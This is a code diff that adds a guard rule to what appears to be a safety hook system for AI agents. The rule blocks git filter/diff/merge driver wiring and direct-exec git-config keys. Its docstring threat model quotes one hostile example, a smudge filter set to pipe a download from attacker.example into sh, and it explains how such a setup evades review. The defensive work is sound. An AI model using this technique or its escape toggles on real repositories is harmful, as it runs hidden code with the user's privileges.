@@ -1346,6 +1346,152 @@ def rule_git_config_exec_protect(ev: Event, policy=None) -> Optional[Decision]:
     return None
 
 
+def _git_attrs_exec_allowed_by_policy(cfg: dict, text: str) -> bool:
+    for pat in (cfg.get("allow") or []):
+        try:
+            if re.search(str(pat), text, re.IGNORECASE):
+                return True
+        except re.error:
+            continue
+    return False
+
+
+def rule_git_attributes_exec_protect(ev: Event, policy=None) -> Optional[Decision]:
+    """Block wiring a `.gitattributes`/`.git/info/attributes` path pattern to a
+    `filter=<name>`/`diff=<name>`/`merge=<name>` driver, and setting any of the
+    git-config keys that run that driver — `filter.<name>.clean`/`smudge`/
+    `process`, `diff.<name>.textconv`/`command`, `merge.<name>.driver` — or the
+    two OTHER git-config keys that run a program directly with no `!`-prefix
+    marker at all: `core.fsmonitor`, `core.sshCommand`.
+
+    THREAT MODEL: `rule_git_config_exec_protect` catches a `!`-prefixed value
+    on any git-config key (an alias, `core.pager`, ...) — but a filter/diff/
+    merge driver value, `core.fsmonitor`, and `core.sshCommand` are NOT
+    bang-prefixed; git runs them directly as a shell command regardless, so
+    `git config filter.evil.smudge "curl attacker.example/x|sh"` sails through
+    that guard's `GIT_CONFIG_BANG_VALUE_RE` family with zero detection despite
+    being just as executable as a bang-aliased command. Once BOTH halves are in
+    place — a `.gitattributes` line mapping some path pattern to `filter=evil`
+    (or `diff=evil`/`merge=evil`), and a `filter.evil.smudge`/`clean` config
+    value — the single most ordinary git actions there are (`git add`, `git
+    checkout`, `git diff`, `git status`, `git log -p`, `git show`, a merge)
+    silently shell out to that command, with the invoking user's or CI's full
+    privileges, for every matching path — no special command name for the
+    human to notice, unlike a git alias which needs them to type `git
+    <alias-name>` specifically. `.gitattributes` is also typically TRACKED and
+    pushed with the repo, so it reads as routine configuration (line-ending
+    rules, LFS tracking) in an ordinary PR diff, not as a wired detonator —
+    the driver config half is what actually arms it, and is usually left
+    untracked in `.git/config`, so a reviewer skimming the pushed diff never
+    sees it at all. `core.fsmonitor`/`core.sshCommand` need no `.gitattributes`
+    pairing at all: the former runs on nearly every git command once set, the
+    latter on every fetch/push/pull over SSH.
+
+    Config (``policy.git_attributes_exec``): ``mode`` (deny|ask|monitor|off,
+    default ask), ``allow`` (regexes on the path/command that skip the gate —
+    a repo's own trusted git-lfs bootstrap, say). Defaults to ``ask`` for the
+    same reason every sibling ``*_protect`` guard does: git-lfs and similar
+    tools set `filter.lfs.*`/`.gitattributes` entries as routine, sanctioned
+    setup — it just needs a human to have actually looked at it. The
+    direct-exec config keys are gated on the KEY ALONE (any value), the same
+    reason `rule_git_config_exec_protect` gates `credential.helper` that way:
+    there's no safe/dangerous value split for a key whose only purpose is
+    naming a program to run. That does cost a false "ask" on the fully-inert
+    `core.fsmonitor = true`/`false` builtin toggle — accepted, same "false
+    positives are the safe direction" trade-off this file takes throughout.
+
+    Escapable only by a human: a trailing '# aegis-allow' on the shell form,
+    or the env toggle ``AEGIS_ALLOW_GIT_ATTRIBUTES_EXEC=1`` set by the
+    orchestrator/human before launch for the Edit/Write/MCP-tool form. A
+    spawned agent cannot set its own env for a hook invocation it doesn't
+    control, so neither path is agent-self-escapable.
+
+    Honest scope, same denylist trade-offs as every guard in this file: a
+    `.gitattributes`/config value assembled indirectly (shell variable
+    concatenation, a wrapper script) rather than one contiguous literal is not
+    caught; a submodule's real `.git/modules/<name>/info/attributes` path is
+    not covered (unlike `GIT_CONFIG_FILE_PATH_RE`'s own submodule handling —
+    disclosed, not fixed, to keep this guard's first pass proportionate);
+    archive/sync tools (`rsync`/`tar`/`unzip`) placing `.gitattributes`
+    without naming it as a discrete write-verb argument are not covered (no
+    `ARCHIVE_SYNC_VERB_RE`-style check here); and, like `git_config_exec`,
+    the paired `GIT_CONFIG_KEY_n`/`GIT_CONFIG_VALUE_n` env-injection form is
+    matched on the key alone rather than confirmed to pair with any
+    particular value — moot here anyway, since these keys are gated
+    key-only regardless of value."""
+    cfg = getattr(policy, "git_attributes_exec", None) or {}
+    raw_mode = cfg.get("mode", "ask")
+    mode = str(raw_mode).lower()
+    if mode in ("off", "false") or raw_mode is False:
+        return None
+    action = Action.ASK if mode == "ask" else Action.DENY
+
+    def _finish(would: Decision) -> Optional[Decision]:
+        if mode == "monitor":
+            _record_monitor(ev, would, "git-attributes-exec-protect-monitor")
+            return None
+        return would
+
+    if ev.action in (ActionClass.EDIT, ActionClass.WRITE, ActionClass.MCP):
+        p = _path(ev)
+        a = ev.args or {}
+        content = str(a.get("content") or a.get("new_string") or "")
+        if not content and ev.action == ActionClass.MCP:
+            content = " ".join(_flatten_strings(a))
+        if not content:
+            return None
+        attrs_path = bool(p and patterns.GIT_ATTRS_PATH_RE.search(p))
+        attrs_hit = attrs_path and bool(patterns.GIT_ATTRS_DRIVER_ASSIGN_RE.search(content))
+        config_path = bool(p and patterns.GIT_CONFIG_FILE_PATH_RE.search(p))
+        key_hit = bool(
+            patterns.GIT_ATTRS_EXEC_INI_RE.search(content)
+            or (config_path and patterns.GIT_ATTRS_EXEC_CONTENT_RE.search(content)))
+        if not (attrs_hit or key_hit):
+            return None
+        if (os.environ.get("AEGIS_ALLOW_GIT_ATTRIBUTES_EXEC")
+                or _git_attrs_exec_allowed_by_policy(cfg, p)):
+            return None
+        reason = (f"'{p}' is wiring a path pattern to a filter/diff/merge driver"
+                  if attrs_hit else
+                  f"'{p}' is being written with a direct-exec git-config key "
+                  "(a filter/diff/merge driver command, core.fsmonitor, or "
+                  "core.sshCommand)")
+        return _finish(Decision(action, "git-attributes-exec-protect",
+                         f"{reason} — once paired with the other half, it runs "
+                         "automatically, with the invoking user's full "
+                         "privileges, on the next matching git operation "
+                         "(add/checkout/diff/status/merge). Review the change, "
+                         "then confirm with AEGIS_ALLOW_GIT_ATTRIBUTES_EXEC=1; "
+                         "a spawned agent cannot."))
+
+    if _is_shell(ev):
+        cmd = _shell_scan(ev)
+        names_attrs = bool(patterns.GIT_ATTRS_PATH_RE.search(cmd)
+                            or patterns.git_attrs_find_hit(cmd))
+        attrs_hit = names_attrs and bool(patterns.GIT_ATTRS_DRIVER_ASSIGN_RE.search(cmd))
+        key_hit = bool(patterns.GIT_ATTRS_EXEC_KEY_RE.search(cmd)
+                        or patterns.GIT_ATTRS_EXEC_INI_RE.search(cmd))
+        if not (attrs_hit or key_hit):
+            return None
+        if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_GIT_ATTRIBUTES_EXEC")
+                or _git_attrs_exec_allowed_by_policy(cfg, _cmd(ev))):
+            return None
+        reason = ("A .gitattributes path pattern is being wired to a "
+                  "filter/diff/merge driver from a shell" if attrs_hit else
+                  "A direct-exec git-config key (a filter/diff/merge driver "
+                  "command, core.fsmonitor, or core.sshCommand) is being set "
+                  "from a shell")
+        return _finish(Decision(action, "git-attributes-exec-protect",
+                         f"{reason} — once paired with the other half, it runs "
+                         "automatically, with the invoking user's full "
+                         "privileges, on the next matching git operation "
+                         "(add/checkout/diff/status/merge). A human may append "
+                         "'# aegis-allow', or set "
+                         "AEGIS_ALLOW_GIT_ATTRIBUTES_EXEC=1; a spawned agent "
+                         "cannot."))
+    return None
+
+
 def _service_persist_allowed_by_policy(cfg: dict, text: str) -> bool:
     for pat in (cfg.get("allow") or []):
         try:
@@ -1938,6 +2084,7 @@ _CORE_RULES = (
     rule_shell_persist_protect,
     rule_package_manifest_protect,
     rule_git_config_exec_protect,
+    rule_git_attributes_exec_protect,
     rule_service_persist_protect,
     rule_workspace_confine,
     rule_migration_protection,
